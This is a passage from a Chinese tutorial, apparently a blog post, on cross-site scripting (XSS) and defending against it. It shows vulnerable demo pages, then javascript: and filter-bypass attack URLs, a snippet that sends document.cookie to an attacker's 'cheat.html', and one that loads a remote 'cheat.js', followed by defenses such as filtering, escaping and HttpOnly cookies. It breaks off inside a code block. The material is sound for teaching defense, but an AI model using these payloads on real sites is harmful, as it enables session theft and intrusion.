现在浏览器就不会再执行里面的代码了,实际业务中应该转义的内容不止这么简单</p>
<p><img src="https://hmxyl-image.oss-cn-hangzhou.aliyuncs.com/note/bVbvZSp-1670834128685-3.png" alt="图片描述"></p>
<h3 id="基于某些业务-例如登录-订单等需要携带参数或者重定向等信息-B写了这么一个页面">基于某些业务,例如登录,订单等需要携带参数或者重定向等信息,B写了这么一个页面</h3>
<figure class="highlight xml"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span> <span class="attr">lang</span>=<span class="string">"en"</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">"UTF-8"</span> /&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">title</span>&gt;</span>demo<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">div</span>&gt;</span></span><br><span class="line">            output:</span><br><span class="line">            <span class="tag">&lt;<span class="name">input</span> <span class="attr">id</span>=<span class="string">"out"</span> /&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">a</span> <span class="attr">id</span>=<span class="string">"jump"</span>&gt;</span>jump<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"></span><br><span class="line">        <span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">"http://libs.baidu.com/jquery/2.0.0/jquery.min.js"</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">            $(<span class="keyword">function</span>(<span class="params"></span>) {</span></span><br><span class="line"><span class="language-javascript">                <span class="keyword">var</span> $jump = $(<span class="string">'#jump'</span>);</span></span><br><span class="line"><span class="language-javascript">                <span class="keyword">var</span> $output = $(<span class="string">'#out'</span>);</span></span><br><span class="line"><span class="language-javascript">                <span class="keyword">var</span> $submit = $(<span class="string">'#submit'</span>);</span></span><br><span class="line"><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">                <span class="keyword">function</span> <span class="title function_">getQueryString</span>(<span class="params">name</span>) {</span></span><br><span class="line"><span class="language-javascript">                    <span class="keyword">var</span> reg = <span class="keyword">new</span> <span class="title class_">RegExp</span>(<span class="string">'(^|&amp;)'</span> + name + <span class="string">'=([^&amp;]*)(&amp;|$)'</span>, <span class="string">'i'</span>);</span></span><br><span class="line"><span class="language-javascript">                    <span class="keyword">var</span> r = <span class="variable language_">window</span>.<span class="property">location</span>.<span class="property">search</span>.<span class="title function_">substr</span>(<span class="number">1</span>).<span class="title function_">match</span>(reg);</span></span><br><span class="line"><span class="language-javascript">                    <span class="keyword">if</span> (r != <span class="literal">null</span>) <span class="keyword">return</span> <span class="built_in">unescape</span>(r[<span class="number">2</span>]);</span></span><br><span class="line"><span class="language-javascript">                    <span class="keyword">return</span> <span class="literal">null</span>;</span></span><br><span class="line"><span class="language-javascript">                }</span></span><br><span class="line"><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">                <span class="keyword">var</span> val = <span class="title function_">getQueryString</span>(<span class="string">'redirect_to'</span>);</span></span><br><span class="line"><span class="language-javascript">        $output.<span class="title function_">val</span>(val)</span></span><br><span class="line"><span class="language-javascript">                $jump.<span class="title function_">attr</span>(<span class="string">'href'</span>, val);</span></span><br><span class="line"><span class="language-javascript">            });</span></span><br><span class="line"><span class="language-javascript">        </span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></tbody></table></figure>
<p>完整源码可以查看<a target="_blank" rel="noopener" href="https://link.segmentfault.com/?enc=iN%2FDwn9%2F8fycAncTRlrXKA%3D%3D.DVFSSINJ%2FfLXCiLJLyfw3GVNbolgisMCBONF%2FsmFnz59VkbkSfVqBtyCY%2BdfykrZ">demo3</a><br>
A发现一个漏洞,然后发了这个网址给其他人打开</p>
<figure class="highlight awk"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https:<span class="regexp">//</span>www.test.com/?redirect_to=javascript:alert(<span class="string">'XSS'</span>)</span><br></pre></td></tr></tbody></table></figure>
<p>当他们点击跳转的时候就会触发A故意形成的恶意代码</p>
<p><img src="https://hmxyl-image.oss-cn-hangzhou.aliyuncs.com/note/bVbvZSa-1670834128685-5.png" alt="图片描述"></p>
<p>像这种情况B第一想法是检验是否网址格式再渲染界面,所以他这么写</p>
<figure class="highlight kotlin"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">function testUrl(str) {</span><br><span class="line">  <span class="keyword">var</span> Expression =</span><br><span class="line">    <span class="string">'^((https|http|ftp|rtsp|mms)?://)?'</span> +</span><br><span class="line">    <span class="string">'(([0-9a-z_!~*().&amp;=+$%-]+: )?[0-9a-z_!~*().&amp;=+$%-]+@)?'</span> + <span class="comment">//ftp的user@</span></span><br><span class="line">    <span class="string">'(([0-9]{1,3}.){3}[0-9]{1,3}|'</span> + <span class="comment">// IP形式的URL- 199.194.52.184</span></span><br><span class="line">    <span class="string">'([0-9a-z_!~*()-]+.)*'</span> + <span class="comment">// 域名- www.</span></span><br><span class="line">    <span class="string">'[a-z]{2,6})'</span> + <span class="comment">//域名的扩展名</span></span><br><span class="line">    <span class="string">'(:[0-9]{1,4})?'</span> + <span class="comment">// 端口- :80</span></span><br><span class="line">    <span class="string">'((/?)|(/[0-9a-z_!~*().;?:@&amp;=+$,%#-]+)+/?)$'</span>;</span><br><span class="line">  <span class="keyword">var</span> objExp = new RegExp(Expression);</span><br><span class="line">  <span class="keyword">if</span> (objExp.test(str) != <span class="literal">true</span>) {</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">  } <span class="keyword">else</span> {</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">  }</span><br><span class="line">}</span><br><span class="line"><span class="keyword">var</span> <span class="keyword">val</span> = getQueryString(<span class="string">'redirect_to'</span>);</span><br><span class="line">$output.<span class="keyword">val</span>(<span class="keyword">val</span>);</span><br><span class="line">testUrl(<span class="keyword">val</span>) &amp;&amp; $jump.attr(<span class="string">'href'</span>, <span class="keyword">val</span>);</span><br></pre></td></tr></tbody></table></figure>
<p>完整源码可以查看<a target="_blank" rel="noopener" href="https://link.segmentfault.com/?enc=XG9ZRtG8WVR1AAsTugI%2BMg%3D%3D.jJuFJ1RYX5hcvELG8WL0FshynDkHfxkgMbRrSi7YU84%2FxeqIdUhWT7OBeTEU41oF">demo4</a><br>
因为富文本有问题,只能截图.</p>
<p>但是不是每个<code>a</code>标签都是用于跳转页面的,例如通过Scheme协议打开APP界面</p>
<figure class="highlight routeros"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;a <span class="attribute">href</span>=<span class="string">"Scheme协议"</span>&gt;</span><br></pre></td></tr></tbody></table></figure>
<p>这样子你就把其他非属性跳转的用法都干掉了,所以B想了想不妥,还是换一种方式禁止,直接判断执行前缀</p>
<figure class="highlight kotlin"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> <span class="keyword">val</span> = getQueryString(<span class="string">'redirect_to'</span>);</span><br><span class="line"><span class="keyword">var</span> reg = /javascript:/gi;</span><br><span class="line">$output.<span class="keyword">val</span>(<span class="keyword">val</span>);</span><br><span class="line">!reg.test(<span class="keyword">val</span>) &amp;&amp; $jump.attr(<span class="string">'href'</span>, <span class="keyword">val</span>);</span><br></pre></td></tr></tbody></table></figure>
<p>完整源码可以查看<a target="_blank" rel="noopener" href="https://link.segmentfault.com/?enc=GKh%2Bza854rEwRA1V4aHVFw%3D%3D.IAKeiENsJj5PkeI0wWJ6i5cBmzfsu0hp8fYODACE%2B43AikV4MPPB52U3QdRf8QkC">demo5</a><br>
因为浏览器不区分大小写,所以需要注意一下.更新版本之后B以为已经堵死这条路了,殊不知A换个方式改成编码或者回车空格等</p>
<figure class="highlight ruby"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="symbol">https:</span>/<span class="regexp">/www.test.com/</span><span class="string">?r</span>edirect_to=jav <span class="symbol">ascript:</span>alert(<span class="string">'XSS'</span>);</span><br><span class="line"><span class="symbol">https:</span>/<span class="regexp">/www.test.com/</span><span class="string">?r</span>edirect_to=javascrip?<span class="number">74</span><span class="symbol">:alert</span>(<span class="string">'XSS'</span>);</span><br></pre></td></tr></tbody></table></figure>
<p>这就尴尬了,虽然浏览器并不会执行,但是这些也能完全避开B的拦截规则,也可能会引起其他隐患</p>
<h3 id="还有种内联数据用法-将序列化的数据通过URL传递给其他页面使用">还有种内联数据用法,将序列化的数据通过URL传递给其他页面使用</h3>
<figure class="highlight xml"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span> <span class="attr">lang</span>=<span class="string">"en"</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">"UTF-8"</span> /&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">title</span>&gt;</span>demo<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">div</span>&gt;</span></span><br><span class="line">            output:</span><br><span class="line">            <span class="tag">&lt;<span class="name">input</span> <span class="attr">id</span>=<span class="string">"out"</span> /&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"></span><br><span class="line">        <span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">"http://libs.baidu.com/jquery/2.0.0/jquery.min.js"</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">            $(<span class="keyword">function</span>(<span class="params"></span>) {</span></span><br><span class="line"><span class="language-javascript">                <span class="keyword">var</span> $output = $(<span class="string">'#out'</span>);</span></span><br><span class="line"><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">                <span class="keyword">function</span> <span class="title function_">getQueryString</span>(<span class="params">name</span>) {</span></span><br><span class="line"><span class="language-javascript">                    <span class="keyword">var</span> reg = <span class="keyword">new</span> <span class="title class_">RegExp</span>(<span class="string">'(^|&amp;)'</span> + name + <span class="string">'=([^&amp;]*)(&amp;|$)'</span>, <span class="string">'i'</span>);</span></span><br><span class="line"><span class="language-javascript">                    <span class="keyword">var</span> r = <span class="variable language_">window</span>.<span class="property">location</span>.<span class="property">search</span>.<span class="title function_">substr</span>(<span class="number">1</span>).<span class="title function_">match</span>(reg);</span></span><br><span class="line"><span class="language-javascript">                    <span class="keyword">if</span> (r != <span class="literal">null</span>) <span class="keyword">return</span> <span class="built_in">unescape</span>(r[<span class="number">2</span>]);</span></span><br><span class="line"><span class="language-javascript">                    <span class="keyword">return</span> <span class="literal">null</span>;</span></span><br><span class="line"><span class="language-javascript">                }</span></span><br><span class="line"><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">                <span class="keyword">var</span> val = <span class="title class_">JSON</span>.<span class="title function_">parse</span>(<span class="title function_">getQueryString</span>(<span class="string">'data'</span>));</span></span><br><span class="line"><span class="language-javascript">                $output.<span class="title function_">val</span>(val.<span class="property">data</span>).<span class="title function_">html</span>(val.<span class="property">data</span>);</span></span><br><span class="line"><span class="language-javascript">            });</span></span><br><span class="line"><span class="language-javascript">        </span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></tbody></table></figure>
<p>完整源码可以查看<a target="_blank" rel="noopener" href="https://link.segmentfault.com/?enc=lw1mgiqi%2BgpjsN7XtxGtgQ%3D%3D.kSUSKSu1hIaylfuR9LAXYDYeyafnFTEOJghTWig0wbJBV0b3YrMUzIFvVR4G74cI">demo6</a><br>
A可以直接修改URL参数注入代码</p>
<figure class="highlight awk"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https:<span class="regexp">//</span>www.test.com<span class="regexp">/?data={"data":"&lt;script&gt;alert(\"XSS\")&lt;/</span>script&gt;<span class="string">"}</span></span><br></pre></td></tr></tbody></table></figure>
<p><img src="https://hmxyl-image.oss-cn-hangzhou.aliyuncs.com/note/bVbvZSt-1670834128685-7.png" alt="图片描述"></p>
<h3 id="A通过恶意脚本在页面插入图片自动发起恶意请求">A通过恶意脚本在页面插入图片自动发起恶意请求</h3>
<figure class="highlight javascript"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> img = <span class="variable language_">document</span>.<span class="title function_">createElement</span>(<span class="string">'img'</span>);</span><br><span class="line">img.<span class="property">src</span> =</span><br><span class="line">  <span class="string">'http://www.test.com/cheat.html?url='</span> +</span><br><span class="line">  <span class="built_in">escape</span>(<span class="variable language_">window</span>.<span class="property">location</span>.<span class="property">href</span>) +</span><br><span class="line">  <span class="string">'&amp;content='</span> +</span><br><span class="line">  <span class="built_in">escape</span>(<span class="variable language_">document</span>.<span class="property">cookie</span>);</span><br><span class="line">img.<span class="property">style</span> = <span class="string">'display:none'</span>;</span><br><span class="line"><span class="variable language_">document</span>.<span class="property">body</span>.<span class="title function_">appendChild</span>(img);</span><br></pre></td></tr></tbody></table></figure>
<p>完整源码可以查看<a target="_blank" rel="noopener" href="https://link.segmentfault.com/?enc=HyNsNtiso%2FP4qBVkuB3HBg%3D%3D.K5rc87juwtWRDIwIUga7MX1WYXIAHW0fkwI8NBV9olOSDk4sZUlLGfAoOHsEbh8f">demo7</a><br>
B让服务端采用了比较简单的办法使用<code>httponly</code>禁止JS脚本访问cookies信息让A无法拿到</p>
<h3 id="A通过事件注入恶意脚本">A通过事件注入恶意脚本</h3>
<figure class="highlight dart"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> img = <span class="built_in">document</span>.createElement(<span class="string">'img'</span>);</span><br><span class="line">img.src = <span class="string">'#'</span>;</span><br><span class="line">img.onerror = <span class="built_in">document</span>.body.appendChild(<span class="built_in">document</span>.createElement(<span class="string">'script'</span>)).src =</span><br><span class="line">  <span class="string">'http://www.test.com/cheat.js'</span>;</span><br><span class="line">img.style = <span class="string">'display:none'</span>;</span><br><span class="line"><span class="built_in">document</span>.body.appendChild(img);</span><br></pre></td></tr></tbody></table></figure>
<p>完整源码可以查看<a target="_blank" rel="noopener" href="https://link.segmentfault.com/?enc=0E77Ps%2B91Qg%2FBv1D3QCfeA%3D%3D.nfOm9N11kbP9QyK63oB%2Fg0psy1yz3KmkDcTxo8dGIXTtfgSc29jKHGuJTX1Q6XHX">demo8</a><br>
当浏览器向web服务器发送请求的时候，一般会带上<code>Referer</code>，告诉服务器我是从哪个页面链接过来的，服务器基此可以获得一些信息用于处理。可以让服务端限制必须是白名单才能通过请求达到防盗链功能,但是丢失<code>Refere</code>情况比较多,而且容易被恶意修改,所以大多只适用于资源被恶意引用的情况</p>
<h3 id="A利用浏览器的解码顺序进行混合编码组装">A利用浏览器的解码顺序进行混合编码组装</h3>
<p>当浏览器进行绘制时，解码顺序分别为 HTML &gt; URL &gt; JS,所以A构造了这么一段代码</p>
<figure class="highlight perl"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;a href=<span class="string">"javascript&amp;#58;alert('\&lt;<span class="variable">%E</span>6<span class="variable">%B</span>5%8B<span class="variable">%E</span>8%AF<span class="variable">%95</span>\&gt;')"</span>&gt;jump&lt;/a&gt;</span><br></pre></td></tr></tbody></table></figure>
<p>首先是 HTML 解码，结果为</p>
<figure class="highlight perl"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;a href=<span class="string">"javascript:alert('\&lt;<span class="variable">%E</span>6<span class="variable">%B</span>5%8B<span class="variable">%E</span>8%AF<span class="variable">%95</span>\&gt;')"</span>&gt;jump&lt;/a&gt;</span><br></pre></td></tr></tbody></table></figure>
<p>然后是 URL 解码，结果为</p>
<figure class="highlight xml"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">"javascript:alert('\&lt;测试\&gt;')"</span>&gt;</span>jump<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br></pre></td></tr></tbody></table></figure>
<p>最后是 JS 解码，结果为</p>
<figure class="highlight xml"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">"javascript:alert('&lt;测试&gt;')"</span>&gt;</span>jump<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br></pre></td></tr></tbody></table></figure>
<p>所以可以攻击的方式很多种,相比于针对处理我们应该先了解相关的攻击方式</p>
<h2 id="XSS攻击方式">XSS攻击方式</h2>
<ul>
<li>
<p>所有用户输入内容都有潜在的风险</p>
</li>
<li>
<p>利用<code>script</code>标签注入<code>HTML/Javascript</code>代码</p>
</li>
<li>
<p>利用拥有<code>href</code>和<code>src</code>等属性的标签</p>
</li>
<li>
<p>利用空格、回车和Tab等拼接方式绕开拦截</p>
</li>
<li>
<p>利用字符编码绕开拦截（JS支持unicode、eacapes、十六进制、十进制等编码形式）</p>
</li>
<li>
<p>利用<code>onload</code>,<code>onscroll</code>等事件执行恶意代码</p>
</li>
<li>
<p>利用样式属性<code>backgrund-image</code>等执行(听说主流浏览器已处理)</p>
</li>
<li>
<p>URL参数</p>
</li>
<li>
<p>Cookies</p>
</li>
<li>
<p>请求<code>header</code>的<code>referer</code></p>
</li>
<li>
<p>恶意代码拆分组装</p>
</li>
<li>
<p>各种API</p>
<figure class="highlight stylus"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// URL相关</span></span><br><span class="line">document<span class="selector-class">.location</span></span><br><span class="line">document<span class="selector-class">.URL</span></span><br><span class="line">document<span class="selector-class">.URLUnencoded</span></span><br><span class="line">document<span class="selector-class">.referrer</span></span><br><span class="line">window<span class="selector-class">.location</span></span><br><span class="line"><span class="comment">// 操作dom</span></span><br><span class="line">document<span class="selector-class">.write</span>()</span><br><span class="line">document<span class="selector-class">.writeln</span>()</span><br><span class="line">document<span class="selector-class">.boby</span><span class="selector-class">.innerHtml</span></span><br><span class="line"><span class="comment">// 特殊函数</span></span><br><span class="line"><span class="function"><span class="title">eval</span><span class="params">()</span></span></span><br><span class="line">window<span class="selector-class">.execScript</span>()</span><br><span class="line">window<span class="selector-class">.setInterval</span>()</span><br><span class="line">window<span class="selector-class">.setTimeout</span>()</span><br><span class="line"><span class="comment">// 重定向</span></span><br><span class="line">document<span class="selector-class">.location</span></span><br><span class="line">document<span class="selector-class">.URL</span></span><br><span class="line">document<span class="selector-class">.open</span>()</span><br><span class="line">window<span class="selector-class">.location</span><span class="selector-class">.href</span></span><br><span class="line">window<span class="selector-class">.navigate</span>()</span><br><span class="line">window.open</span><br></pre></td></tr></tbody></table></figure>
</li>
</ul>
<p>总的来说分两种类型:</p>
<ol>
<li>攻击者手动提交恶意代码</li>
<li>浏览器自动执行恶意代码</li>
</ol>
<h2 id="防御">防御</h2>
<ul>
<li>
<p>针对上面的案例如果B选择前端进行内容转义,会引起什么问题呢?</p>
<p>如果攻击者不直接经过前端界面,而是直接自己构造请求就可以破解了</p>
</li>
<li>
<p>但是B是在发送请求之前转义又会有什么问题?</p>
<p>如果是需要用于界面展示的话,引用到字段的地方都需要处理,大部分模板都会自动转义处理,但是如果用在JS不能直接使用或者计算,例如长度判断等</p>
<p>需要根据上下文采用不同的转义规则增大处理难度,如 HTML 属性、HTML 文字内容、HTML 注释、跳转链接、内联 JavaScript 字符串、内联 CSS 样式表等,所以这更适用于固定类型的内容,例如URL,号码等</p>
</li>
</ul>
<h3 id="XSS-Filter">XSS Filter</h3>
<ul>
<li>用户提交数据进行验证,只接受限定长度/内容</li>
<li>表单数据指定具体类型</li>
<li>过滤移除特殊的html标签,<code>script</code>和<code>iframe</code>等</li>
<li>过滤移除特殊的Javascript代码,<code>javascript:</code>和事件等</li>
</ul>
<h3 id="HTML-Entity-举例部分">HTML Entity(举例部分)</h3>
<table>
<thead>
<tr>
<th style="text-align:center">符号</th>
<th style="text-align:center">实体编号</th>
</tr>
</thead>
<tbody>
<tr>
<td style="text-align:center">&lt;</td>
<td style="text-align:center">&lt;</td>
</tr>
<tr>
<td style="text-align:center">&gt;</td>
<td style="text-align:center">&gt;</td>
</tr>
<tr>
<td style="text-align:center">&amp;</td>
<td style="text-align:center">&amp;</td>
</tr>
<tr>
<td style="text-align:center">"</td>
<td style="text-align:center">"</td>
</tr>
<tr>
<td style="text-align:center">’</td>
<td style="text-align:center">'</td>
</tr>
<tr>
<td style="text-align:center">空格</td>
<td style="text-align:center">&nbsp;</td>
</tr>
</tbody>
</table>
<h3 id="请求限制">请求限制</h3>
<ul>
<li>将重要的Cookie标记为HTTP Only,不能通过客户端脚本读取和修改</li>
<li>设置<code>referer</code>防止恶意请求</li>
<li>实现Session标记(session tokens)、CAPTCHA系统或者HTTP引用头检查，以防功能被第三方网站所执行</li>
</ul>
<h3 id="防御实现代码举例">防御实现代码举例</h3>
<figure class="highlight xml"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">&lt;!-- 非法参数过滤器 --&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">filter</span>&gt;</span></span><br><span class="line">		<span class="tag">&lt;<span class="name">filter-name</span>&gt;</span>IllegalCharacterFilter<span class="tag">&lt;/<span class="name">filter-name</span>&gt;</span></span><br><span class="line">		<span class="tag">&lt;<span class="name">filter-class</span>&gt;</span>com.hots.ssp.common.safety.IllegalCharacterFilter<span class="tag">&lt;/<span class="name">filter-class</span>&gt;</span></span><br><span class="line">		<span class="tag">&lt;<span class="name">init-param</span>&gt;</span></span><br><span class="line">			<span class="comment">&lt;!-- 配置不需要被登录过滤器拦截的链接，只支持配后缀、前缀 及全路径，多个配置用逗号分隔 --&gt;</span></span><br><span class="line">			<span class="tag">&lt;<span class="name">param-name</span>&gt;</span>excludedPaths<span class="tag">&lt;/<span class="name">param-name</span>&gt;</span></span><br><span class="line">			<span class="tag">&lt;<span class="name">param-value</span>&gt;</span>/images/*,*.jsp, *.css, *.ico<span class="tag">&lt;/<span class="name">param-value</span>&gt;</span></span><br><span class="line">		<span class="tag">&lt;/<span class="name">init-param</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;/<span class="name">filter</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">filter-mapping</span>&gt;</span></span><br><span class="line">		<span class="tag">&lt;<span class="name">filter-name</span>&gt;</span>IllegalCharacterFilter<span class="tag">&lt;/<span class="name">filter-name</span>&gt;</span></span><br><span class="line">		<span class="tag">&lt;<span class="name">url-pattern</span>&gt;</span>/*<span class="tag">&lt;/<span class="name">url-pattern</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;/<span class="name">filter-mapping</span>&gt;</span></span><br></pre></td></tr></tbody></table></figure>
<figure class="highlight java"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span 